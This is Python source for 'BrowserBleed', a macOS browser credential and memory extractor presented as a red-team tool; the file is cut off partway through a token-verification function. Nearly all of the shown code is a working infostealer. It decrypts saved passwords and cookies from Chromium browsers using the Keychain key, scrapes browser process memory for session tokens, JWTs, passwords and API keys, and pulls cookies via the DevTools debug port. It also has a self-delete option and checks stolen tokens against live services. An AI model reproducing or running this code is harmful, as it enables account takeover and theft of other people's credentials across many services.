"""
BrowserBleed macOS - Browser Credential & Memory Extractor
Authorized Red Team / Research Use Only

Requires: Python 3.11+, cryptography (pip install cryptography)
Run with sudo for memory scraping and process access.

Notes:
  - Chrome 130+ uses app-bound encryption; Keychain key may not decrypt v10 data.
    Works reliably on Brave, Edge, Vivaldi, Opera, and older Chrome.
  - Memory scraping requires root (task_for_pid). Apple Silicon with SIP on will
    block some system processes but not browser renderer/GPU processes.
  - Keychain access from sudo may still prompt on some macOS versions.

Usage:
  sudo python3 BrowserBleed_mac.py                    # all browsers, disk + memory
  sudo python3 BrowserBleed_mac.py --browser chrome   # target one browser
  sudo python3 BrowserBleed_mac.py --disk-only        # skip memory scraping
  sudo python3 BrowserBleed_mac.py --memory-only      # skip disk extraction
  sudo python3 BrowserBleed_mac.py --out results.txt  # custom output path
  sudo python3 BrowserBleed_mac.py --max-hits 500     # raise memory hit cap
  sudo python3 BrowserBleed_mac.py --self-delete      # delete script after run
  sudo python3 BrowserBleed_mac.py --verify           # verify tokens against services (outbound)
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import ctypes
import ctypes.util
import tempfile
import time
import re
import subprocess
import argparse
import socket
import struct
import http.client
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime, timedelta, timezone

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

if sys.stdout is not None:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")


# ── Mach API setup ─────────────────────────────────────────────────────────────
_kern_return_t     = ctypes.c_int32
_mach_port_t       = ctypes.c_uint32
_mach_vm_address_t = ctypes.c_uint64
_mach_vm_size_t    = ctypes.c_uint64

KERN_SUCCESS              = 0
VM_PROT_READ              = 0x01
VM_REGION_BASIC_INFO_64       = 9
VM_REGION_BASIC_INFO_COUNT_64 = 9  # sizeof(vm_region_basic_info_64) / 4 = 36 / 4


class _VMRegionBasicInfo64(ctypes.Structure):
    # #pragma pack(4) matches XNU kernel header — keeps sizeof at 36
    _pack_ = 4
    _fields_ = [
        ("protection",       ctypes.c_int32),
        ("max_protection",   ctypes.c_int32),
        ("inheritance",      ctypes.c_uint32),
        ("shared",           ctypes.c_int32),
        ("reserved",         ctypes.c_int32),
        ("offset",           ctypes.c_uint64),
        ("behavior",         ctypes.c_int32),
        ("user_wired_count", ctypes.c_uint16),
    ]


if sys.platform == "darwin":
    _libsystem = ctypes.CDLL("/usr/lib/libSystem.B.dylib")

    _libsystem.mach_task_self.restype  = _mach_port_t
    _libsystem.mach_task_self.argtypes = []

    _libsystem.task_for_pid.restype  = _kern_return_t
    _libsystem.task_for_pid.argtypes = [_mach_port_t, ctypes.c_int32, ctypes.POINTER(_mach_port_t)]

    _libsystem.mach_vm_region.restype  = _kern_return_t
    _libsystem.mach_vm_region.argtypes = [
        _mach_port_t,
        ctypes.POINTER(_mach_vm_address_t),
        ctypes.POINTER(_mach_vm_size_t),
        ctypes.c_int32,
        ctypes.c_void_p,
        ctypes.POINTER(ctypes.c_uint32),
        ctypes.POINTER(_mach_port_t),
    ]

    _libsystem.mach_vm_read_overwrite.restype  = _kern_return_t
    _libsystem.mach_vm_read_overwrite.argtypes = [
        _mach_port_t,
        _mach_vm_address_t,
        _mach_vm_size_t,
        _mach_vm_address_t,
        ctypes.POINTER(_mach_vm_size_t),
    ]

    _libsystem.mach_port_deallocate.restype  = _kern_return_t
    _libsystem.mach_port_deallocate.argtypes = [_mach_port_t, _mach_port_t]
else:
    _libsystem = None


# ── Process utilities ──────────────────────────────────────────────────────────
def is_root() -> bool:
    return os.geteuid() == 0


def find_pids(name: str) -> list[int]:
    try:
        r = subprocess.run(["pgrep", "-f", name], capture_output=True, text=True)
        return [int(p) for p in r.stdout.split() if p.strip().isdigit()]
    except Exception:
        return []


def is_process_running(name: str) -> bool:
    return bool(find_pids(name))


def _pid_site_map(process_name: str) -> dict[int, str]:
    """Map each renderer PID → site URL via --site-instance-site in the process command line."""
    sites: dict[int, str] = {}
    try:
        r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if process_name.lower() not in line.lower():
                continue
            m_site = re.search(r"--site-instance-site=(https?://[^\s]+)", line)
            # ps aux: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
            m_pid  = re.match(r"\S+\s+(\d+)", line)
            if m_site and m_pid:
                sites[int(m_pid.group(1))] = m_site.group(1)
    except Exception:
        pass
    return sites


# ── File copy utilities ────────────────────────────────────────────────────────
def copy_db_with_wal(src: str) -> str:
    """Copy a SQLite DB and its -wal/-shm companions to a temp dir.
    On macOS, Chrome's file locking is advisory so a direct copy usually works.
    Returns path to copied DB; caller must rmtree the parent dir.
    """
    tmp_dir = tempfile.mkdtemp()
    db_name = os.path.basename(src)
    tmp_db  = os.path.join(tmp_dir, db_name)

    try:
        shutil.copy2(src, tmp_db)
    except Exception as e:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        raise OSError(f"Could not copy database: {e}") from e

    for suffix in ("-wal", "-shm"):
        companion = src + suffix
        if os.path.exists(companion):
            try:
                shutil.copy2(companion, tmp_db + suffix)
            except Exception:
                pass

    return tmp_db


def sqlite_connect(path: str, retries: int = 8, delay: float = 0.25):
    last_err = None
    for _ in range(retries):
        try:
            return sqlite3.connect(path)
        except Exception as e:
            last_err = e
            time.sleep(delay)
    raise last_err


# ── Keychain + crypto ──────────────────────────────────────────────────────────
def get_keychain_password(service: str, account: str) -> bytes:
    sudo_user = os.environ.get("SUDO_USER")
    cmd = ["security", "find-generic-password", "-s", service, "-a", account, "-w"]
    if sudo_user:
        cmd = ["sudo", "-u", sudo_user] + cmd
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"Keychain lookup failed for '{service}': {r.stderr.strip()}")
    return r.stdout.strip().encode()


def get_master_key(user_data_path: str, keychain_name: str) -> bytes:
    """Derive the AES-128 key from the Keychain password using PBKDF2-SHA1."""
    password = get_keychain_password(f"{keychain_name} Safe Storage", keychain_name)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1003,
        backend=default_backend(),
    )
    return kdf.derive(password)


def decrypt_value(key: bytes, enc: bytes) -> str:
    if not enc:
        return ""
    try:
        if enc[:3] == b"v10":
            # AES-128-CBC, IV = 16 space chars (Chrome macOS convention)
            iv        = b" " * 16
            cipher    = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(enc[3:]) + decryptor.finalize()
            pad_len   = plaintext[-1]  # PKCS7 padding
            return plaintext[:-pad_len].decode("utf-8", errors="replace")
        # Plaintext (pre-v10 or unsupported format)
        return enc.decode("utf-8", errors="replace")
    except Exception as e:
        return f"<decrypt error: {e}>"


def chrome_epoch_to_str(us: int) -> str:
    if not us:
        return "session"
    try:
        return (datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=us)).strftime(
            "%Y-%m-%d %H:%M:%S UTC"
        )
    except Exception:
        return str(us)


# ── Memory scraping ────────────────────────────────────────────────────────────
CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
    "JWT token":           re.compile(rb"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}"),
    "Bearer token":        re.compile(rb"(?i)Bearer\s+[A-Za-z0-9\-._~+/]{20,}"),
    "Authorization header":re.compile(rb"Authorization:\s*[A-Za-z]+\s+[A-Za-z0-9\-._~+/=]{20,}"),
    "Cookie header":       re.compile(rb"Cookie:\s*[\x20-\x7e]{40,512}"),
    "Set-Cookie header":   re.compile(rb"Set-Cookie:\s*[\x20-\x7e]{20,512}"),
    "OAuth access_token":  re.compile(rb"(?i)access_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})"),
    "OAuth refresh_token": re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})"),
    "Session token":       re.compile(rb"(?i)session[_-]?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=%]{20,256})"),
    "Session ID":          re.compile(rb"(?i)session[_-]?id[\"'\s]*[=:][\"'\s]*([A-Fa-f0-9\-]{16,128})"),
    "Password (POST body)":re.compile(rb"(?i)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
    "Password (JSON/API)": re.compile(rb'(?i)"password"\s*:\s*"([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})"'),
    "Google SAPISID":      re.compile(rb"SAPISID=[A-Za-z0-9_/\-]{20,}"),
    "Slack token":         re.compile(rb"xox[baprs]-[A-Za-z0-9\-]{10,}"),
    "GitHub token":        re.compile(rb"gh[pousr]_[A-Za-z0-9]{36,}"),
    "Discord token":       re.compile(rb"[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"),
}

_NOISE_BYTES = re.compile(
    rb'%[a-z]'
    rb'|\{[a-zA-Z_][a-zA-Z0-9_]*\}'
    rb'|"type":"string"'
    rb'|:\s*boolean[,\s]'
    rb'|JwkSymKey'
    rb'|LoggableString'
    rb'|\(function\s*\('
    rb'|\|\|\(\w+=\{\}\)\)'
    rb'|[a-z]\.[a-zA-Z]+\.[a-zA-Z]+[Tt]oken'
)

_NOISE_EXACT: frozenset[str] = frozenset([
    "Password=true",
    "password://settings/developers",
])


def _is_noise(raw: bytes, decoded: str) -> bool:
    if decoded.strip() in _NOISE_EXACT:
        return True
    if _NOISE_BYTES.search(raw):
        return True
    return False


def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
    if _libsystem is None:
        raise RuntimeError("Memory scraping requires macOS")
    task = _mach_port_t(0)
    kr   = _libsystem.task_for_pid(_libsystem.mach_task_self(), ctypes.c_int32(pid), ctypes.byref(task))
    if kr != KERN_SUCCESS:
        raise PermissionError(f"task_for_pid failed (kr={kr})")

    raw_hits: list[dict] = []
    addr = _mach_vm_address_t(1)

    try:
        while len(raw_hits) < max_hits:
            size     = _mach_vm_size_t(0)
            info     = _VMRegionBasicInfo64()
            count    = ctypes.c_uint32(VM_REGION_BASIC_INFO_COUNT_64)
            obj_name = _mach_port_t(0)

            kr = _libsystem.mach_vm_region(
                task,
                ctypes.byref(addr),
                ctypes.byref(size),
                ctypes.c_int32(VM_REGION_BASIC_INFO_64),
                ctypes.cast(ctypes.byref(info), ctypes.c_void_p),
                ctypes.byref(count),
                ctypes.byref(obj_name),
            )
            if kr != KERN_SUCCESS:
                break

            region_addr = addr.value
            region_size = size.value

            if info.protection & VM_PROT_READ:
                prev_data = b""  # tail of previous chunk within this region
                for offset in range(0, region_size, chunk):
                    read_size = min(chunk, region_size - offset)
                    buf       = ctypes.create_string_buffer(read_size)
                    out_size  = _mach_vm_size_t(0)
                    kr2 = _libsystem.mach_vm_read_overwrite(
                        task,
                        _mach_vm_address_t(region_addr + offset),
                        _mach_vm_size_t(read_size),
                        _mach_vm_address_t(ctypes.addressof(buf)),
                        ctypes.byref(out_size),
                    )
                    if kr2 != KERN_SUCCESS or not out_size.value:
                        prev_data = b""
                        continue
                    data = buf.raw[: out_size.value]
                    for label, pat in CREDENTIAL_PATTERNS.items():
                        for m in pat.finditer(data):
                            raw_match    = m.group()
                            full_decoded = raw_match.decode(errors="replace")
                            if not _is_noise(raw_match, full_decoded):
                                value = m.group(m.lastindex).decode(errors="replace") if m.lastindex else full_decoded
                                if label == "Session ID":
                                    dedup_key = value.rstrip("-")[:50]
                                elif m.lastindex:
                                    dedup_key = value[:50]
                                else:
                                    dedup_key = value[:120]
                                pre = prev_data[-2048:] if prev_data else b""
                                ctx = pre + data[:min(len(data), m.end() + 2048)]
                                raw_hits.append({
                                    "label":     label,
                                    "address":   hex(region_addr + offset + m.start()),
                                    "value":     value,
                                    "dedup_key": dedup_key,
                                    "pid":       pid,
                                    "context":   ctx,
                                })
                    prev_data = data
                    if len(raw_hits) >= max_hits:
                        break

            addr = _mach_vm_address_t(region_addr + region_size)
    finally:
        _libsystem.mach_port_deallocate(_libsystem.mach_task_self(), task)

    return raw_hits


def deduplicate(hits: list[dict]) -> list[dict]:
    """Group by dedup_key, keep shortest value in each group (fewest absorbed noise bytes)."""
    groups: dict[str, list[dict]] = {}
    for h in hits:
        key = h.get("dedup_key", h["value"][:120])
        groups.setdefault(key, []).append(h)
    result = [min(g, key=lambda h: len(h["value"])) for g in groups.values()]
    result.sort(key=lambda h: int(h["address"], 16))
    return result


# ── Browser config ─────────────────────────────────────────────────────────────
_APP_SUPPORT = os.path.join(os.path.expanduser("~"), "Library", "Application Support")

# (display_name, process_name, user_data_path, keychain_name)
BROWSERS = [
    ("Google Chrome",  "Google Chrome",  os.path.join(_APP_SUPPORT, "Google", "Chrome"),                     "Chrome"),
    ("Microsoft Edge", "Microsoft Edge", os.path.join(_APP_SUPPORT, "Microsoft Edge"),                       "Microsoft Edge"),
    ("Brave",          "Brave Browser",  os.path.join(_APP_SUPPORT, "BraveSoftware", "Brave-Browser"),       "Brave Browser"),
    ("Vivaldi",        "Vivaldi",        os.path.join(_APP_SUPPORT, "Vivaldi"),                               "Vivaldi"),
    ("Opera",          "Opera",          os.path.join(_APP_SUPPORT, "com.operasoftware.Opera"),               "Opera"),
    ("Opera GX",       "Opera GX",       os.path.join(_APP_SUPPORT, "com.operasoftware.OperaGX"),            "Opera"),
    ("Chromium",       "Chromium",       os.path.join(_APP_SUPPORT, "Chromium"),                             "Chromium"),
]


# ── Disk extraction ────────────────────────────────────────────────────────────
def extract_credentials(profile_path: str, master_key: bytes) -> list[dict]:
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return []
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        conn    = sqlite_connect(tmp_db)
        results = [
            {"url": url, "username": user, "password": decrypt_value(master_key, enc) if enc else ""}
            for url, user, enc in conn.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
        ]
        conn.close()
        return results
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


def extract_cookies(profile_path: str, master_key: bytes) -> list[dict]:
    for candidate in [os.path.join("Network", "Cookies"), "Cookies"]:
        db_path = os.path.join(profile_path, candidate)
        if os.path.exists(db_path):
            break
    else:
        return []

    results: list[dict] = []

    def _query(conn):
        for host, name, value, enc, path, exp, secure, httponly in conn.execute(
            "SELECT host_key, name, value, encrypted_value, path, "
            "expires_utc, is_secure, is_httponly FROM cookies"
        ):
            results.append({
                "host": host, "name": name,
                "value": decrypt_value(master_key, enc) if enc else value,
                "path": path, "expires": chrome_epoch_to_str(exp),
                "secure": bool(secure), "httponly": bool(httponly),
            })
        conn.close()

    # Attempt 1: immutable read (works when Chrome not actively writing)
    try:
        uri = "file://" + os.path.abspath(db_path).replace(" ", "%20") + "?mode=ro&immutable=1"
        _query(sqlite3.connect(uri, uri=True))
        if results:
            return results
        results.clear()
    except Exception:
        results.clear()

    # Attempt 2: copy DB + WAL
    tmp_dir = None
    try:
        tmp_db  = copy_db_with_wal(db_path)
        tmp_dir = os.path.dirname(tmp_db)
        _query(sqlite_connect(tmp_db))
        return results
    except Exception as e:
        raise RuntimeError(f"Cookie extraction failed: {e}") from e
    finally:
        if tmp_dir:
            shutil.rmtree(tmp_dir, ignore_errors=True)


# ── CDP cookie extraction ──────────────────────────────────────────────────────
def unix_ts_to_str(ts: float) -> str:
    if ts <= 0:
        return "session"
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except Exception:
        return str(ts)


def _cdp_find_port(process_name: str) -> int | None:
    # Check process command line for explicit --remote-debugging-port flag
    try:
        r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if process_name.lower() in line.lower():
                m = re.search(r"--remote-debugging-port=(\d+)", line)
                if m:
                    return int(m.group(1))
    except Exception:
        pass
    # Probe common debug ports
    for port in (9222, 9229, 9223, 9224):
        try:
            conn = http.client.HTTPConnection("localhost", port, timeout=1)
            conn.request("GET", "/json/version")
            resp = conn.getresponse()
            if resp.status == 200:
                data = json.loads(resp.read().decode(errors="replace"))
                if "webSocketDebuggerUrl" in data or "Browser" in data:
                    return port
        except Exception:
            pass
    return None


def _ws_connect(host: str, port: int, path: str) -> socket.socket:
    s = socket.create_connection((host, port), timeout=8)
    s.settimeout(15)
    key = base64.b64encode(os.urandom(16)).decode()
    hs  = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
           f"Origin: http://localhost\r\n\r\n")
    s.sendall(hs.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise ConnectionError("WebSocket handshake incomplete")
        buf += chunk
    if b" 101 " not in buf.split(b"\r\n")[0]:
        raise ConnectionError(f"WebSocket upgrade failed: {buf[:200]!r}")
    return s


def _ws_send(s: socket.socket, msg: str) -> None:
    payload = msg.encode()
    mask    = os.urandom(4)
    masked  = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    n       = len(payload)
    if n < 126:
        header = bytes([0x81, 0x80 | n]) + mask
    elif n < 65536:
        header = bytes([0x81, 0xFE]) + struct.pack(">H", n) + mask
    else:
        header = bytes([0x81, 0xFF]) + struct.pack(">Q", n) + mask
    s.sendall(header + masked)


def _ws_read_frame(s: socket.socket) -> tuple[bool, int, bytes]:
    def recv_exact(n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = s.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("WebSocket connection closed")
            buf += chunk
        return buf

    h      = recv_exact(2)
    fin    = bool(h[0] & 0x80)
    opcode = h[0] & 0x0F
    masked = bool(h[1] & 0x80)
    n      = h[1] & 0x7F
    if n == 126:
        n = struct.unpack(">H", recv_exact(2))[0]
    elif n == 127:
        n = struct.unpack(">Q", recv_exact(8))[0]
    mask_key = recv_exact(4) if masked else b""
    raw      = recv_exact(n)
    payload  = bytes(b ^ mask_key[i % 4] for i, b in enumerate(raw)) if masked else raw
    return fin, opcode, payload


def _ws_recv_msg(s: socket.socket) -> str:
    parts = []
    while True:
        fin, opcode, payload = _ws_read_frame(s)
        if opcode == 9:
            mask = os.urandom(4)
            pong = bytes([0x8A, 0x80 | len(payload)]) + mask + bytes(
                b ^ mask[i % 4] for i, b in enumerate(payload)
            )
            s.sendall(pong)
            continue
        if opcode == 8:
            raise ConnectionError("WebSocket closed by server")
        parts.append(payload)
        if fin:
            break
    return b"".join(parts).decode(errors="replace")


def _cdp_call(ws_url: str, method: str, params: dict | None = None) -> dict | None:
    parsed = urllib.parse.urlparse(ws_url)
    host   = parsed.hostname or "localhost"
    port   = parsed.port or 80
    path   = parsed.path
    s = _ws_connect(host, port, path)
    try:
        _ws_send(s, json.dumps({"id": 1, "method": method, "params": params or {}}))
        while True:
            data = json.loads(_ws_recv_msg(s))
            if data.get("id") == 1:
                return data.get("result")
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def extract_cookies_cdp(process_name: str) -> list[dict]:
    port = _cdp_find_port(process_name)
    if port is None:
        return []
    try:
        conn    = http.client.HTTPConnection("localhost", port, timeout=5)
        conn.request("GET", "/json")
        resp    = conn.getresponse()
        targets = json.loads(resp.read().decode(errors="replace"))
        ws_url  = next(
            (t["webSocketDebuggerUrl"] for t in targets if t.get("webSocketDebuggerUrl")),
            None,
        )
        if not ws_url:
            return []
    except Exception:
        return []
    result = _cdp_call(ws_url, "Network.getAllCookies")
    if not result:
        return []
    cookies = []
    for ck in result.get("cookies", []):
        cookies.append({
            "host":     ck.get("domain", ""),
            "name":     ck.get("name", ""),
            "value":    ck.get("value", ""),
            "path":     ck.get("path", ""),
            "expires":  unix_ts_to_str(ck.get("expires", -1)),
            "secure":   ck.get("secure", False),
            "httponly": ck.get("httpOnly", False),
        })
    return cookies


# ── Service identification & verification ──────────────────────────────────────

_CTX_URL_PAT    = re.compile(rb"https?://([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_HOST_PAT   = re.compile(rb"Host:\s*([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_DOMAIN_PAT = re.compile(rb'"(?:domain|iss|host|origin|issuer|audience)"\s*:\s*"([a-zA-Z0-9\-\./]+)"')
_CTX_COOKIE_DOM = re.compile(rb"[Dd]omain=\.?([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")

_DOMAIN_SVC: list[tuple[str, str]] = [
    ("api.anthropic.com",               "Anthropic / Claude"),
    ("claude.ai",                       "Anthropic / Claude"),
    ("accounts.google.com",             "Google Accounts"),
    ("oauth2.googleapis.com",           "Google OAuth2"),
    ("identitytoolkit.googleapis.com",  "Firebase Auth"),
    ("firebase.googleapis.com",         "Firebase / GCP"),
    ("googleapis.com",                  "Google API"),
    ("google.com",                      "Google"),
    ("api.github.com",                  "GitHub"),
    ("github.com",                      "GitHub"),
    ("raw.githubusercontent.com",       "GitHub"),
    ("api.slack.com",                   "Slack"),
    ("slack.com",                       "Slack"),
    ("api.openai.com",                  "OpenAI"),
    ("chat.openai.com",                 "OpenAI"),
    ("openai.com",                      "OpenAI"),
    ("discord.com",                     "Discord"),
    ("discordapp.com",                  "Discord"),
    ("login.microsoftonline.com",       "Microsoft / Azure AD"),
    ("graph.microsoft.com",             "Microsoft Graph"),
    ("microsoftonline.com",             "Microsoft / Azure AD"),
    ("login.live.com",                  "Microsoft"),
    ("outlook.office365.com",           "Microsoft 365"),
    ("microsoft.com",                   "Microsoft"),
    ("appleid.apple.com",               "Apple ID"),
    ("idmsa.apple.com",                 "Apple ID"),
    ("apple.com",                       "Apple"),
    ("api.notion.com",                  "Notion"),
    ("notion.so",                       "Notion"),
    ("gitlab.com",                      "GitLab"),
    ("api.digitalocean.com",            "DigitalOcean"),
    ("digitalocean.com",                "DigitalOcean"),
    ("auth0.com",                       "Auth0"),
    ("okta.com",                        "Okta"),
    ("cognito-idp",                     "AWS Cognito"),
    ("amazonaws.com",                   "AWS"),
    ("api.stripe.com",                  "Stripe"),
    ("stripe.com",                      "Stripe"),
    ("atlassian.net",                   "Atlassian"),
    ("atlassian.com",                   "Atlassian"),
    ("api.figma.com",                   "Figma"),
    ("figma.com",                       "Figma"),
    ("api.linear.app",                  "Linear"),
    ("linear.app",                      "Linear"),
    ("api.vercel.com",                  "Vercel"),
    ("vercel.com",                      "Vercel"),
    ("api.twilio.com",                  "Twilio"),
    ("twilio.com",                      "Twilio"),
    ("clerk.com",                       "Clerk"),
    ("clerk.dev",                       "Clerk"),
    ("supabase.co",                     "Supabase"),
    ("supabase.com",                    "Supabase"),
    ("ollama.com",                      "Ollama"),
    ("netlify.com",                     "Netlify"),
    ("heroku.com",                      "Heroku"),
    ("pingidentity.com",                "PingIdentity"),
    ("onelogin.com",                    "OneLogin"),
    ("salesforce.com",                  "Salesforce"),
    ("api.twitter.com",                 "Twitter / X"),
    ("api.x.com",                       "Twitter / X"),
    ("twitter.com",                     "Twitter / X"),
    ("x.com",                           "Twitter / X"),
    ("api.linkedin.com",                "LinkedIn"),
    ("linkedin.com",                    "LinkedIn"),
    ("graph.facebook.com",              "Meta Graph API"),
    ("facebook.com",                    "Meta"),
    ("instagram.com",                   "Instagram"),
]


def _domain_matches(frag: str, domain: str) -> bool:
    if "." in frag:
        return domain == frag or domain.endswith(f".{frag}")
    return domain.startswith(f"{frag}.") or domain == frag


def _service_from_context(context: bytes) -> str | None:
    candidates: list[str] = []
    for pat in (_CTX_URL_PAT, _CTX_HOST_PAT, _CTX_DOMAIN_PAT, _CTX_COOKIE_DOM):
        for m in pat.finditer(context):
            try:
                domain = m.group(1).decode(errors="replace").lower().strip("/").split(":")[0]
                if "." in domain and 4 < len(domain) < 128:
                    candidates.append(domain)
            except Exception:
                pass
    for domain in candidates:
        for frag, svc in _DOMAIN_SVC:
            if _domain_matches(frag, domain):
                return svc
    return None


_ISS_MAP = [
    ("accounts.google.com",   "Google"),
    ("github.com",             "GitHub"),
    ("microsoftonline.com",    "Microsoft / Azure AD"),
    ("login.microsoft.com",    "Microsoft / Azure AD"),
    ("apple.com",              "Apple"),
    ("cognito-idp",            "AWS Cognito"),
    ("auth0.com",              "Auth0"),
    ("okta.com",               "Okta"),
    ("clerk",                  "Clerk"),
    ("supabase",               "Supabase"),
    ("firebase",               "Firebase / GCP"),
    ("anthropic",              "Anthropic / Claude"),
    ("claude.ai",              "Anthropic / Claude"),
    ("ollama.com",             "Ollama"),
    ("discord.com",            "Discord"),
    ("atlassian",              "Atlassian"),
    ("salesforce",             "Salesforce"),
    ("onelogin",               "OneLogin"),
    ("pingidentity",           "PingIdentity"),
]

_KID_MAP: list[tuple[re.Pattern, str]] = [
    (re.compile(r"^key-\d+$"), "Google"),
]

_oidc_cache: dict[str, str | None] = {}


def _decode_jwt_claims(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad  = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _decode_jwt_header(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad = parts[0] + "=" * (4 - len(parts[0]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _oidc_discover(issuer_url: str) -> str | None:
    if issuer_url in _oidc_cache:
        return _oidc_cache[issuer_url]
    result = None
    try:
        base = re.match(r"https?://[^/]+", issuer_url)
        url  = (base.group() if base else issuer_url.rstrip("/")) + "/.well-known/openid-configuration"
        status, data = _http_get(url, timeout=3)
        if status == 200:
            iss_field = data.get("issuer", "")
            m = re.search(r"https?://([^/]+)", iss_field)
            if m:
                domain = m.group(1).lower()
                for frag, svc_name in _DOMAIN_SVC:
                    if _domain_matches(frag, domain):
                        result = svc_name
                        break
                if result is None:
                    result = domain
    except Exception:
        pass
    _oidc_cache[issuer_url] = result
    return result


def identify_service(label: str, value: str, context: bytes = b"") -> str:
    v = value[7:] if value.startswith("Bearer ") else value
    if v is value and value.startswith("Basic "):
        v = value[6:]
    if v.startswith("ya29."):
        return "Google OAuth2"
    if v[:4] in ("QUFL", "QUJF", "QUEy", "QUFF"):
        return "Google OAuth2"
    gh_types = {"ghp_": "personal", "gho_": "OAuth app", "ghu_": "user-to-server",
                "ghs_": "server-to-server", "ghr_": "refresh"}
    if v[:4] in gh_types:
        return f"GitHub ({gh_types[v[:4]]})"
    slack_map = {"xoxb": "bot token", "xoxp": "user token", "xoxa": "app token",
                 "xoxr": "refresh", "xoxs": "service token"}
    if v[:4] in slack_map:
        return f"Slack ({slack_map[v[:4]]})"
    if v.startswith("sk-"):     return "OpenAI"
    if v.startswith("glpat-"): return "GitLab"
    if v.startswith("dp."):    return "DigitalOcean"
    if v.startswith("pat_"):   return "Notion"
    if label == "Google SAPISID":  return "Google (YouTube / Gmail)"
    if label == "Discord token":   return "Discord"
    if label == "Slack token":     return "Slack"
    if label == "GitHub token":    return "GitHub"
    if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):
        return "Anthropic / Claude"
    if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
        header = _decode_jwt_header(v)
        kid    = str(header.get("kid", ""))
        for pat, svc in _KID_MAP:
            if pat.match(kid):
                return f"JWT — {svc}"

        claims   = _decode_jwt_claims(v)
        iss      = str(claims.get("iss", ""))
        aud      = claims.get("aud", "")
        if isinstance(aud, list):
            aud = " ".join(str(a) for a in aud)
        combined = f"{iss} {aud}".lower()
        for pattern, name in _ISS_MAP:
            if pattern in combined:
                return f"JWT — {name}"
        m = re.search(r"https?://([^/\s]+)", iss)
        if m:
            discovered = _oidc_discover(iss)
            if discovered:
                return f"JWT — {discovered}"
            return f"JWT — {m.group(1)}"
        if iss:
            return f"JWT — {iss[:50]}"
        # Scan all string claim values for embedded URLs (redirect_uri, client_id, etc.)
        for claim_val in claims.values():
            if not isinstance(claim_val, str) or not claim_val.startswith("http"):
                continue
            cm = re.search(r"https?://([^/\s?#]+)", claim_val)
            if not cm:
                continue
            domain = cm.group(1).lower()
            for frag, svc_name in _DOMAIN_SVC:
                if _domain_matches(frag, domain):
                    return f"JWT — {svc_name}"
            return f"JWT — {domain}"
        if context:
            svc = _service_from_context(context)
            if svc:
                return f"JWT — {svc}"
        return "JWT — unknown issuer"
    if context:
        svc = _service_from_context(context)
        if svc:
            return svc
    return "Unknown service"


def _http_get(url: str, headers: dict | None = None, timeout: int = 6) -> tuple[int, dict]:
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode(errors="replace"))
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"_error": str(e)}


def verify_google_oauth(token: str) -> dict:
    status, data = _http_get(f"https://oauth2.googleapis.com/tokeninfo?access_token={token}")
    if status == 200:
        scope       = data.get("scope", "")
        scope_short = " ".join(s.split("/")[-1] for s in scope.split())[:80]
        return {
